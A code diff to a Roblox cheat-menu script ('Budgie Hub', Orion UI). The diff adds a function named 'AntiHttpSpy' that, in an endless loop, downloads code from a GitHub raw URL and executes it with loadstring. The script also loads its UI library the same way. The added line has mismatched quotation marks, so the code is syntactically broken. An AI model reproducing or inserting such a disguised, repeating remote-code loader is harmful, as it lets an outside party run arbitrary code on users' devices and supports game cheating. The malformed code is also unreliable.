@@ -1,3 +1,12 @@
+local function AntiHttpSpy()
+while true do 
+  task.wait()
+   loadstring(game:HttpGet('https://raw.githubusercontent.com/ADSKerOffical/Gyvyvtvtv/main/Exehiper"))()
+  end
+end
+
+AntiHttpSpy()
+wait(2)
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/ionlyusegithubformcmods/1-Line-Scripts/main/Mobile%20Friendly%20Orion')))()
 
 local Window = OrionLib:MakeWindow({Name = "Budgie Hub | Симулятор падения в канаву 1.0", HidePremium = true, IntroEnabled = false, SaveConfig = false, ConfigFolder = "OrionTest"})
